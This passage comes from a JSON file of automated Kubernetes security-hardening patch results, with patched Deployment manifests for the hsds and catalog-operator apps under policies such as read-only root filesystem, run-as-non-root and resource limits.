AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "errors": []
  },
  {
    "id": "01627",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          valueFrom:\n            secretKeyRef:\n              name: user-password\n              key: password_file\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: dn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "errors": []
  },
  {
    "id": "01628",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          valueFrom:\n            secretKeyRef:\n              name: user-password\n              key: password_file\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: dn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "errors": []
  },
  {
    "id": "01629",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          valueFrom:\n            secretKeyRef:\n              name: user-password\n              key: password_file\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: dn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "errors": []
  },
  {
    "id": "01630",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          valueFrom:\n            secretKeyRef:\n              name: user-password\n              key: password_file\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: dn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "errors": []
  },
  {
    "id": "01631",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          valueFrom:\n            secretKeyRef:\n              name: user-password\n              key: password_file\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: dn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "errors": []
  },
  {
    "id": "01632",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          valueFrom:\n            secretKeyRef:\n              name: user-password\n              key: password_file\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: dn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "errors": []
  },
  {
    "id": "01633",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          valueFrom:\n            secretKeyRef:\n              name: user-password\n              key: password_file\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: dn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "errors": []
  },
  {
    "id": "01634",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          valueFrom:\n            secretKeyRef:\n              name: user-password\n              key: password_file\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      - name: dn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "errors": []
  },
  {
    "id": "01635",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        - -namespace\n        - operator-lifecycle-manager\n        - -debug\n        image: quay.io/coreos/catalog@sha256:8fc933e660a5b143bce7a5e4cb1606630fa9497cc252a7e47e0def3c18268f45\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01636",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        - -namespace\n        - operator-lifecycle-manager\n        - -debug\n        image: quay.io/coreos/catalog@sha256:8fc933e660a5b143bce7a5e4cb1606630fa9497cc252a7e47e0def3c18268f45\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01637",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        - -namespace\n        - operator-lifecycle-manager\n        - -debug\n        image: quay.io/coreos/catalog@sha256:8fc933e660a5b143bce7a5e4cb1606630fa9497cc252a7e47e0def3c18268f45\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01638",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        - -namespace\n        - operator-lifecycle-manager\n        - -debug\n        image: quay.io/coreos/catalog@sha256:8fc933e660a5b143bce7a5e4cb1606630fa9497cc252a7e47e0def3c18268f45\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01639",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
